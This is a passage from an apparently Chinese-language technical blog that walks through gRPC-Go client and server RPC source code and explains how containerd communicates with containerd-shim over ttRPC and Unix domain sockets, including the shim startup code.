锁定连接: 确保在检查连接状态时不会有其他线程修改 conn 对象。 健康检查: 调用 HealthService().Check 方法，检查 containerd 的健康状态，确定服务是否可用。 返回值: 如果服务正在运行并返回 SERVING 状态，则返回 true，否则返回 false 和错误信息。 在 containerd 的代码中，调用 grpc.NewClient 函数实际上是直接使用 gRPC 库中的这个函数来创建 gRPC 客户端连接。这个函数内部会创建和管理与 containerd 服务器的 gRPC 连接，下一部分将详细分析gRPC框架。\n源码链接：grpc-go/clientconn.go at v1.65.0 · grpc/grpc-go (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 func NewClient(target string, opts ...DialOption) (conn *ClientConn, err error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } cc.retryThrottler.Store((*retryThrottler)(nil)) cc.safeConfigSelector.UpdateConfigSelector(\u0026amp;defaultConfigSelector{nil}) cc.ctx, cc.cancel = context.WithCancel(context.Background()) // Apply dial options. disableGlobalOpts := false for _, opt := range opts { if _, ok := opt.(*disableGlobalDialOptions); ok { disableGlobalOpts = true break } } if !disableGlobalOpts { for _, opt := range globalDialOptions { opt.apply(\u0026amp;cc.dopts) } } for _, opt := range opts { opt.apply(\u0026amp;cc.dopts) } // Determine the resolver to use. if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } for _, opt := range globalPerTargetDialOptions { opt.DialOptionForTarget(cc.parsedTarget.URL).apply(\u0026amp;cc.dopts) } chainUnaryClientInterceptors(cc) chainStreamClientInterceptors(cc) if err := cc.validateTransportCredentials(); err != nil { return nil, err } if cc.dopts.defaultServiceConfigRawJSON != nil { scpr := parseServiceConfig(*cc.dopts.defaultServiceConfigRawJSON, cc.dopts.maxCallAttempts) if scpr.Err != nil { return nil, fmt.Errorf(\u0026#34;%s: %v\u0026#34;, invalidDefaultServiceConfigErrPrefix, scpr.Err) } cc.dopts.defaultServiceConfig, _ = scpr.Config.(*ServiceConfig) } cc.mkp = cc.dopts.copts.KeepaliveParams if err = cc.initAuthority(); err != nil { return nil, err } // Register ClientConn with channelz. Note that this is only done after // channel creation cannot fail. cc.channelzRegistration(target) channelz.Infof(logger, cc.channelz, \u0026#34;parsed dial target is: %#v\u0026#34;, cc.parsedTarget) channelz.Infof(logger, cc.channelz, \u0026#34;Channel authority set to %q\u0026#34;, cc.authority) cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) cc.initIdleStateLocked() // Safe to call without the lock, since nothing else has a reference to cc. cc.idlenessMgr = idle.NewManager((*idler)(cc), cc.dopts.idleTimeout) return cc, nil } 在 gRPC 框架中，NewClient 函数负责为给定的目标 URI 创建一个 gRPC “通道”（即 ClientConn）。ClientConn 是 gRPC 客户端与服务器之间的虚拟连接，它可以根据需要创建多个实际连接。这个函数主要执行以下任务：\n解析目标 URI：根据目标 URI 的方案（如 dns:// 或 passthrough://），选择合适的解析器来解析服务地址。 配置连接参数：应用各种拨号选项（如安全凭证、负载均衡策略、重试策略等），并初始化 ClientConn 的状态。 创建连接：在后台尝试与目标地址建立连接，并根据连接状态更新 ClientConn 的状态。 管理连接生命周期：在连接的生命周期中，ClientConn 会自动处理连接失败、重连、负载均衡等逻辑。 5 gRPC框架中的RPC通信 5.1 gRPC-Go 中 RPC 通信 5.1.1 Go 版本 gRPC 通信机制概述 在 gRPC-Go 中，客户端发起的每一个 RPC 调用都会涉及到以下几个步骤：\n发起 RPC 请求：客户端创建一个 RPC 调用，并发送元数据和请求数据。 服务器处理请求：服务器接收到请求，处理并生成响应。 发送响应：服务器将响应发送回客户端。 接收响应：客户端接收到响应，并将结果返回给用户。 5.1.2 Go gRPC 源码结构 gRPC-Go 的源码主要分为以下几个模块：\ntransport：负责底层 HTTP/2 传输的实现。 stream：管理和控制 gRPC 的流。 server 和 client：分别管理 gRPC 服务器和客户端的生命周期。 codec：用于消息的编码和解码。 5.1.3 gRPC-Go 中 RPC 通信流程的源码分析 1、ClientConn 的初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func NewClient(target string, opts ...DialOption) (*ClientConn, error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } // 解析 target 地址，选择合适的 resolver (解析器) if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } // 初始化连接管理和负载均衡 cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) return cc, nil } 2、RPC 请求的发起 在 gRPC-Go 中，RPC 请求的发起主要通过 invoke 方法。这个方法位于 google.golang.org/grpc 包的 call.go 文件中：\n1 2 3 4 5 6 7 8 9 10 func invoke(ctx context.Context, method string, req, reply any, cc *ClientConn, opts ...CallOption) error { cs, err := newClientStream(ctx, unaryStreamDesc, cc, method, opts...) if err != nil { return err } if err := cs.SendMsg(req); err != nil { return err } return cs.RecvMsg(reply) } invoke 方法是客户端执行单个 RPC 调用的入口。它首先通过 newClientStream 方法创建一个新的客户端流（ClientStream），然后发送消息并接收响应。\n3、创建 ClientStream newClientStream 的实现位于 google.golang.org/grpc 包的 stream.go 文件中，它负责初始化 gRPC 的流：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func newClientStream(ctx context.Context, desc *StreamDesc, cc *ClientConn, method string, opts ...CallOption) (_ ClientStream, err error) { // 初始化 stream，设置传输层 t, err := cc.getTransport(ctx, opts...) if err != nil { return nil, err } // 开始流 s, err := t.NewStream(ctx, hdr) if err != nil { return nil, err } return \u0026amp;clientStream{s: s, desc: desc}, nil } 这里的 NewStream 方法是由 transport 层来处理的，它将创建一个新的 HTTP/2 流，用于后续的消息传输。\n4、传输层（Transport Layer） 在 gRPC-Go 中，传输层的核心实现位于 transport/http2_client.go 中。这个文件包含了 gRPC 使用 HTTP/2 进行数据传输的核心逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (t *http2Client) NewStream(ctx context.Context, callHdr *CallHdr) (_ *Stream, err error) { // 创建 HTTP/2 流 t.mu.Lock() s := \u0026amp;Stream{ ... } t.activeStreams[s.id] = s t.mu.Unlock() // 发送请求头部 err = t.framer.writeHeaders(s, ...) if err != nil { return nil, err } return s, nil } NewStream 方法创建一个新的 HTTP/2 流，并通过 writeHeaders 方法将 gRPC 请求的元数据发送到服务器。\n5、消息的发送和接收 在客户端流中，消息的发送和接收通过 SendMsg 和 RecvMsg 方法来完成，这些方法同样位于 stream.go 文件中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 //(cs *clientStream) SendMsg(m any) (err error)函数gRPC-Go 客户端用于发送消息的核心方法。它执行了从消息准备到实际发送的整个过程，并处理错误和重试逻辑。 func (cs *clientStream) SendMsg(m any) (err error) { //错误处理的 defer 逻辑 defer func() { if err != nil \u0026amp;\u0026amp; err != io.EOF { cs.finish(err) } }() if cs.sentLast { //防止重复调用 return status.Errorf(codes.Internal, \u0026#34;SendMsg called after CloseSend\u0026#34;) } if !cs.desc.ClientStreams { //处理非客户端流式的 RPC cs.sentLast = true } // load hdr, payload, data hdr, payload, data, err := prepareMsg(m, cs.codec, cs.cp, cs.comp) if err != nil { //准备消息数据，比如编码什么的 return err } // TODO(dfawley): should we be checking len(data) instead? if len(payload) \u0026gt; *cs.callInfo.maxSendMessageSize { //检查消息大小 return status.Errorf(codes.ResourceExhausted, \u0026#34;trying to send message larger than max (%d vs. %d)\u0026#34;, len(payload), *cs.callInfo.maxSendMessageSize) } op := func(a *csAttempt) error { //消息发送逻辑和重试机制 return a.sendMsg(m, hdr, payload, data) } err = cs.withRetry(op, func() { cs.bufferForRetryLocked(len(hdr)+len(payload), op) }) if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { //二进制日志记录 cm := \u0026amp;binarylog.ClientMessage{ OnClientSide: true, Message: data, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, cm) } } return err } //func (cs *clientStream) RecvMsg(m any) error 是 gRPC-Go 客户端用于接收服务器响应消息的核心方法。这个函数在客户端接收服务器的响应时执行，并包括了错误处理、重试机制、以及日志记录等功能。 func (cs *clientStream) RecvMsg(m any) error { //二进制日志记录初始化 if len(cs.binlogs) != 0 \u0026amp;\u0026amp; !cs.serverHeaderBinlogged { // Call Header() to binary log header if it\u0026#39;s not already logged. cs.Header() } //接收信息的初始化 var recvInfo *payloadInfo if len(cs.binlogs) != 0 { recvInfo = \u0026amp;payloadInfo{} } //消息接收逻辑及重试机制 err := cs.withRetry(func(a *csAttempt) error { return a.recvMsg(m, recvInfo) }, cs.commitAttemptLocked) //二进制日志记录处理 if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { sm := \u0026amp;binarylog.ServerMessage{ OnClientSide: true, Message: recvInfo.uncompressedBytes, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, sm) } } // 结束流或处理错误 if err != nil || !cs.desc.ServerStreams { // err != nil or non-server-streaming indicates end of stream. cs.finish(err) } return err } 上面的SendMsg 和 RecvMsg 方法实际调用了更底层的sendMsg和recvMsg。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 //sendMsg 函数的主要职责是将编码后的消息通过底层传输层发送给服务器，并处理发送过程中的错误和统计信息。 func (a *csAttempt) sendMsg(m any, hdr, payld, data []byte) error { cs := a.cs if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: true, msg: m}, true) } a.mu.Unlock() } if err := a.t.Write(a.s, hdr, payld, \u0026amp;transport.Options{Last: !cs.desc.ClientStreams}); err != nil { if !cs.desc.ClientStreams { // For non-client-streaming RPCs, we return nil instead of EOF on error // because the generated code requires it. finish is not called; RecvMsg() // will call it with the stream\u0026#39;s status independently. return nil } return io.EOF } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, outPayload(true, m, data, payld, time.Now())) } if channelz.IsOn() { a.t.IncrMsgSent() } return nil } //recvMsg 函数的主要职责是从服务器接收消息并解码，同时处理接收过程中的错误、解压缩和统计信息。 func (a *csAttempt) recvMsg(m any, payInfo *payloadInfo) (err error) { cs := a.cs if len(a.statsHandlers) != 0 \u0026amp;\u0026amp; payInfo == nil { payInfo = \u0026amp;payloadInfo{} } if !a.decompSet { // Block until we receive headers containing received message encoding. if ct := a.s.RecvCompress(); ct != \u0026#34;\u0026#34; \u0026amp;\u0026amp; ct != encoding.Identity { if a.dc == nil || a.dc.Type() != ct { // No configured decompressor, or it does not match the incoming // message encoding; attempt to find a registered compressor that does. a.dc = nil a.decomp = encoding.GetCompressor(ct) } } else { // No compression is used; disable our decompressor. a.dc = nil } // Only initialize this state once per stream. a.decompSet = true } err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, payInfo, a.decomp) if err != nil { if err == io.EOF { if statusErr := a.s.Status().Err(); statusErr != nil { return statusErr } return io.EOF // indicates successful end of stream. } return toRPCErr(err) } if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: false, msg: m}, true) } a.mu.Unlock() } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, \u0026amp;stats.InPayload{ Client: true, RecvTime: time.Now(), Payload: m, // TODO truncate large payload. Data: payInfo.uncompressedBytes, WireLength: payInfo.compressedLength + headerLen, CompressedLength: payInfo.compressedLength, Length: len(payInfo.uncompressedBytes), }) } if channelz.IsOn() { a.t.IncrMsgRecv() } if cs.desc.ServerStreams { // Subsequent messages should be received by subsequent RecvMsg calls. return nil } // Special handling for non-server-stream rpcs. // This recv expects EOF or errors, so we don\u0026#39;t collect inPayload. err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, nil, a.decomp) if err == nil { return toRPCErr(errors.New(\u0026#34;grpc: client streaming protocol violation: get \u0026lt;nil\u0026gt;, want \u0026lt;EOF\u0026gt;\u0026#34;)) } if err == io.EOF { return a.s.Status().Err() // non-server streaming Recv returns nil on success } return toRPCErr(err) } 6、 服务器端的处理 在服务器端，RPC 调用的处理通过 handleStream 函数进行管理。这个函数位于 server.go 文件中，handleStream 方法处理传入的流，解析客户端的请求，并调用相应的服务方法来生成响应。\n上下文初始化和追踪信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ctx := stream.Context() ctx = contextWithServer(ctx, s) var ti *traceInfo if EnableTracing { tr := newTrace(\u0026#34;grpc.Recv.\u0026#34;+methodFamily(stream.Method()), stream.Method()) ctx = newTraceContext(ctx, tr) ti = \u0026amp;traceInfo{ tr: tr, firstLine: firstLine{ client: false, remoteAddr: t.Peer().Addr, }, } if dl, ok := ctx.Deadline(); ok { ti.firstLine.deadline = time.Until(dl) } } 上下文准备：从流中提取出上下文，并将服务器相关的信息添加到上下文中。 追踪信息：如果启用了追踪（EnableTracing），函数会创建一个新的追踪对象，并将其添加到上下文中。追踪对象用于记录请求的处理过程和相关的元数据（如客户端地址、截止时间等）。 解析方法名称\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 sm := stream.Method() if sm != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sm[0] == \u0026#39;/\u0026#39; { sm = sm[1:] } pos := strings.LastIndex(sm, \u0026#34;/\u0026#34;) if pos == -1 { // 处理错误的请求方法 if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;Malformed method name %q\u0026#34;, []any{sm}}, true) ti.tr.SetError() } errDesc := fmt.Sprintf(\u0026#34;malformed method name: %q\u0026#34;, stream.Method()) if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } return } service := sm[:pos] method := sm[pos+1:] 方法名称解析：从请求的 Method 中解析出服务名和方法名。如果解析失败（例如方法名称格式不正确），则立即返回一个 Unimplemented 错误状态。 处理元数据和统计信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 md, _ := metadata.FromIncomingContext(ctx) for _, sh := range s.opts.statsHandlers { ctx = sh.TagRPC(ctx, \u0026amp;stats.RPCTagInfo{FullMethodName: stream.Method()}) sh.HandleRPC(ctx, \u0026amp;stats.InHeader{ FullMethod: stream.Method(), RemoteAddr: t.Peer().Addr, LocalAddr: t.Peer().LocalAddr, Compression: stream.RecvCompress(), WireLength: stream.HeaderWireLength(), Header: md, }) } stream.SetContext(ctx) 元数据提取：从上下文中提取元数据（metadata），例如请求头中的信息。 统计处理：遍历所有已配置的统计处理器，并调用它们来记录此次 RPC 调用的统计数据。 根据方法名称选择处理器\n1 2 3 4 5 6 7 8 9 10 11 srv, knownService := s.services[service] if knownService { if md, ok := srv.methods[method]; ok { s.processUnaryRPC(ctx, t, stream, srv, md, ti) return } if sd, ok := srv.streams[method]; ok { s.processStreamingRPC(ctx, t, stream, srv, sd, ti) return } } 服务和方法查找：根据解析出的服务名和方法名，在注册的服务中查找对应的服务对象和方法。 处理请求：如果找到对应的处理器，则调用 processUnaryRPC 或 processStreamingRPC 来处理请求。这两个函数分别用于处理单向 RPC 和流式 RPC。 处理未知服务或方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if unknownDesc := s.opts.unknownStreamDesc; unknownDesc != nil { s.processStreamingRPC(ctx, t, stream, nil, unknownDesc, ti) return } var errDesc string if !knownService { errDesc = fmt.Sprintf(\u0026#34;unknown service %v\u0026#34;, service) } else { errDesc = fmt.Sprintf(\u0026#34;unknown method %v for service %v\u0026#34;, method, service) } if ti != nil { ti.tr.LazyPrintf(\u0026#34;%s\u0026#34;, errDesc) ti.tr.SetError() } if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } 处理未知服务或方法：如果服务或方法未找到，函数会返回一个 Unimplemented 状态，表示客户端请求的服务或方法不存在。如果配置了 unknownStreamDesc，将调用其处理器来处理未知的请求，否则直接返回错误。 我们这里继续往下分析processStreamingRPC函数\nprocessStreamingRPC 是 gRPC-Go 服务器端处理流式 RPC 请求的关键函数。它负责处理客户端与服务器之间的双向或单向流式 RPC 调用。这个函数执行的主要任务包括：初始化上下文和流、处理压缩和解压缩、调用实际的 RPC 方法处理器，并在完成后记录日志和状态。\n1、函数结构概述\nprocessStreamingRPC 处理流式 RPC 的核心逻辑可以分为以下几个主要部分：\n初始化上下文和追踪信息。 初始化流（serverStream）对象。 处理压缩和解压缩逻辑。 调用实际的 RPC 处理器。 处理 RPC 调用后的清理和日志记录。 2、关键步骤解析\n初始化上下文和追踪信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 if channelz.IsOn() { s.incrCallsStarted() } shs := s.opts.statsHandlers var statsBegin *stats.Begin if len(shs) != 0 { beginTime := time.Now() statsBegin = \u0026amp;stats.Begin{ BeginTime: beginTime, IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } for _, sh := range shs { sh.HandleRPC(ctx, statsBegin) } } ctx = NewContextWithServerTransportStream(ctx, stream) 追踪和统计信息：如果启用了 channelz，服务器会增加启动的 RPC 调用计数。然后，如果有配置统计处理器，会记录 RPC 调用的开始时间和其他元数据。 上下文初始化：通过 NewContextWithServerTransportStream 函数将流对象加入到上下文中，便于后续处理。 初始化 serverStream 对象\n1 2 3 4 5 6 7 8 9 10 11 ss := \u0026amp;serverStream{ ctx: ctx, t: t, s: stream, p: \u0026amp;parser{r: stream, recvBufferPool: s.opts.recvBufferPool}, codec: s.getCodec(stream.ContentSubtype()), maxReceiveMessageSize: s.opts.maxReceiveMessageSize, maxSendMessageSize: s.opts.maxSendMessageSize, trInfo: trInfo, statsHandler: shs, } 创建 serverStream：serverStream 是 gRPC-Go 用于处理流式 RPC 请求的核心对象。它包含了与当前流相关的所有信息，如上下文、传输层、编解码器等。 处理压缩和解压缩逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 if rc := stream.RecvCompress(); s.opts.dc != nil \u0026amp;\u0026amp; s.opts.dc.Type() == rc { ss.dc = s.opts.dc } else if rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.decomp = encoding.GetCompressor(rc) if ss.decomp == nil { st := status.Newf(codes.Unimplemented, \u0026#34;grpc: Decompressor is not installed for grpc-encoding %q\u0026#34;, rc) t.WriteStatus(ss.s, st) return st.Err() } } if s.opts.cp != nil { ss.cp = s.opts.cp ss.sendCompressorName = s.opts.cp.Type() } else if rc := stream.RecvCompress(); rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.comp = encoding.GetCompressor(rc) if ss.comp != nil { ss.sendCompressorName = rc } } 解压缩设置：检查客户端请求中使用的压缩方法，如果服务器端配置了对应的解压缩器，则设置在 serverStream 对象中。如果找不到对应的解压缩器，则返回 Unimplemented 错误。 压缩设置：如果服务器配置了压缩器，或者客户端请求中指定了压缩方法，服务器会尝试使用相同的压缩方法响应。 调用实际的 RPC 处理器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var appErr error var server any if info != nil { server = info.serviceImpl } if s.opts.streamInt == nil { appErr = sd.Handler(server, ss) } else { info := \u0026amp;StreamServerInfo{ FullMethod: stream.Method(), IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } appErr = s.opts.streamInt(server, ss, info, sd.Handler) } 实际调用：这里根据是否配置了拦截器（streamInt）来决定如何调用实际的 RPC 处理器（Handler）。如果有拦截器，处理器会被拦截器包装；否则直接调用处理器。 Handler 函数：Handler 是用户定义的处理流式 RPC 请求的函数，它会在服务器端处理从客户端接收到的数据流，并根据逻辑生成响应。 处理 RPC 调用后的清理和日志记录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if appErr != nil { appStatus, ok := status.FromError(appErr) if !ok { appStatus = status.FromContextError(appErr) appErr = appStatus.Err() } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(appStatus.Message()), true) ss.trInfo.tr.SetError() ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } t.WriteStatus(ss.s, appStatus) return appErr } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(\u0026#34;OK\u0026#34;), false) ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } return t.WriteStatus(ss.s, statusOK) 错误处理：如果处理过程中发生错误，函数会将错误转换为 gRPC 状态码并返回给客户端。 日志和追踪：记录处理过程中的日志和追踪信息（如错误信息、响应状态等），确保在调试或监控时有充分的上下文。 返回状态：函数最后会通过 WriteStatus 将处理结果的状态码写回客户端。 接着分析sd.Handler 的来源\n在 gRPC 中，服务和方法的定义通常是在 .proto 文件中定义的，之后通过 gRPC 编译器生成相应的 Go 代码。在生成的代码中，每个服务方法都会有一个对应的 Handler 函数。这个 Handler 函数会在服务注册时被传递给 gRPC 服务器。（所以containerd中的服务都是通过handler来处理的，而非每个服务都是一个单独的进程，同时这里与前面形成了闭环，在containerd的启动中有涉及到服务注册）\nsd 对象：sd 是 *StreamDesc 类型的对象，描述了流式 RPC 方法的特性，包括是否是客户端流、是否是服务器端流，以及处理该 RPC 调用的 Handler 函数。 Handler 字段：sd.Handler 是一个函数类型，用于处理特定的流式 RPC 请求。这个函数是用户在服务注册时提供的，用于执行实际的业务逻辑。 6 Containerd与Containerd-shim通信机制 containerd-shim 和 containerd 之间的通信是容器运行时的核心部分，确保容器的创建、管理和删除等操作能够顺利进行。它们之间的通信主要通过以下方式进行：\n1. ttRPC containerd 和 containerd-shim 之间的通信主要通过一种称为 ttRPC 的轻量级 RPC 框架进行。ttRPC 是 containerd 项目中引入的，专门设计用于高效的进程间通信（IPC），特别是在同一主机上运行的进程之间。\nttRPC: ttRPC 是 containerd 团队开发的一种优化后的 RPC 框架，旨在提供比 gRPC 更低的延迟和更小的开销。它直接通过 Unix 域套接字进行通信，没有 HTTP/2 的开销。 containerd 使用 ttRPC 来向 containerd-shim 发送控制命令，如启动、停止、挂起和删除容器。 在containerd中是这样启动的\n1 2 3 4 5 tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) 2. Unix 域套接字 containerd 和 containerd-shim 之间的通信通常通过 Unix 域套接字进行。这种通信方式非常适合同一主机上的进程间通信，具有低延迟和高效的特点。\nUnix 域套接字: 在启动时，containerd-shim 进程会通过一个专用的 Unix 域套接字与 containerd 建立通信。 这个套接字通常位于 /run/containerd/ 或 /run/containerd/io.containerd.runtime.v2.linux/ 目录下，并带有容器 ID 相关的命名。 3. 容器生命周期管理 containerd 通过 ttRPC 和 Unix 域套接字与 containerd-shim 进行通信，以管理容器的生命周期：\n容器创建: 当 containerd 收到创建容器的请求时，它会启动一个新的 containerd-shim 进程。这个进程负责在 runc 或其他 OCI 兼容的运行时上运行容器。 容器管理: containerd-shim 进程负责处理容器的标准输入/输出流、信号管理以及其他与容器相关的操作。containerd 通过 ttRPC 向 containerd-shim 发送命令（如启动、停止容器）。 容器删除: 当容器退出时，containerd-shim 进程将继续运行，直到 containerd 通过 ttRPC 命令告知 containerd-shim 进程可以安全退出。这确保了即使 containerd 崩溃，容器进程也不会被终止。 4. 容器与守护进程的分离 containerd-shim 的存在还使得容器与 containerd 守护进程分离。这意味着：\n独立性: 即使 containerd 守护进程崩溃或重启，已经运行的容器仍然能够继续运行，因为它们由独立的 containerd-shim 进程管理。 减少依赖: 这种架构减少了对单点故障的依赖，增强了容器运行的稳定性。 7 Containerd-shim与Container通信机制 通信流程 containerd 通过一个runtime来实现对多个容器的控制，例如 create、start 和 stop。\n通信流程如下：\n来自 containerd 的创建容器的客户端请求 containerd 设置容器的文件系统，并创建必要的配置信息 containerd 调用 shim，包括容器配置，这个容器配置决定是启动新的套接字侦听器（shim与container 1：1）还是使用现有的套接字侦听器（1：多） 如果使用现有套接字，则返回现有 socket 的地址并退出 如果是使用新的套接字，则shim a. 创建一个新进程来侦听套接字中来自 containerd 的 ttRPC 命令 b. 将该套接字的地址返回给 containerd c. 退出 containerd 向 shim 发送一个命令来启动容器 containerd 通过 API 调用runtime来创建/启动/停止容器 但是，containerd 本身实际上并不直接调用运行时来启动容器。相反，它期望调用运行时，这将暴露一个套接字 ， 在类 Unix 系统上是 Unix 域，在 Windows 上名为 pipe， 并通过该套接字上的 ttRPC 侦听容器命令。\n运行时有两种常见的模式：\n一个用于运行时的二进制文件，它既侦听套接字又创建/启动/停止容器 一个分离的 Shim 二进制文件，用于侦听套接字，并调用一个单独的运行时引擎来创建/启动/停止容器 使用单独的“shim + engine”模式是因为它可以更轻松地集成实现特定运行时引擎规范（如 OCI 运行时规范）的不同运行时。ttRPC 协议可以通过一个runtime shim进行处理，而可以使用不同的运行时引擎实现，只要它们实现 OCI 运行时规范即可。\n最常用的运行时引擎是 runc，它实施 OCI 运行时规范。由于这是一个运行时引擎，因此 containerd 不会直接调用它;相反，它由 Shim 调用，该 Shim 侦听套接字并调用运行时引擎。\n以下序列图显示了执行 ctr run 命令时的操作流程。\n源码解析 shim启动入口：containerd/cmd/containerd-shim-runc-v2/main.go\n1 2 3 func main() { shim.Run(context.Background(a), manager.NewShimManager(\u0026#34;io.containerd.runc.v2\u0026#34;)) } Run函数：containerd/pkg/shim/shim.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Run initializes and runs a shim server. func Run(ctx context.Context, manager Manager, opts ...BinaryOpts) { var config Config for _, o := range opts { o(\u0026amp;config) } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;runtime\u0026#34;, manager.Name())) if err := run(ctx, manager, config); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;%s: %s\u0026#34;, manager.Name(), err) os.Exit(1) } } shim真正启动：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 //shim 启动 func run(ctx context.Context, manager Manager, config Config) error { //... setRuntime() //... // Handle explicit actions switch action { case \u0026#34;delete\u0026#34;: //... case \u0026#34;start\u0026#34;: opts := StartOpts{ Address: addressFlag, TTRPCAddress: ttrpcAddress, Debug: debugFlag, } // 第一个启动的shim接收的action 就是 start。这里启动第二个shim。address是根据ns和id哈希出来的，会传递给第二个shim,第二个shim会以这个地址起一个server，同时会通过stdout发送给containerd（因为c启动的本进程，所以可以收到），这就是containerd和第二个shim交流的.sock地址。 params, err := manager.Start(ctx, id, opts) if err != nil { return err } data, err := json.Marshal(\u0026amp;params) if err != nil { return fmt.Errorf(\u0026#34;failed to marshal bootstrap params to json: %w\u0026#34;, err) } if _, err := os.Stdout.Write(data); err != nil { return err } return nil } //... unaryInterceptor := chainUnaryServerInterceptors(ttrpcUnaryInterceptors...) server, err := newServer(ttrpc.WithUnaryServerInterceptor(unaryInterceptor)) if err != nil { return fmt.Errorf(\u0026#34;failed creating server: %w\u0026#34;, err) } for _, srv := range ttrpcServices { if err := srv.RegisterTTRPC(server); err != nil { return fmt.Errorf(\u0026#34;failed to register service: %w\u0026#34;, err) } } if err := serve(ctx, server, signals, sd.Shutdown); err != nil { if !errors.Is(err, shutdown.ErrShutdown) { cleanupSockets(ctx) return err } } //... } 启动第二个shim：\n这里有一个有意思地方是第二个shim如何获取自身作为server的socket地址。从代码上看是通过把套接字转换成文件描述符传递给第二个shim，然后第二个shim再还原成listener实现的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 func (manager) Start(ctx context.Context, id string, opts shim.StartOpts) (_ shim.BootstrapParams, retErr error) { var params shim.BootstrapParams params.Version = 3 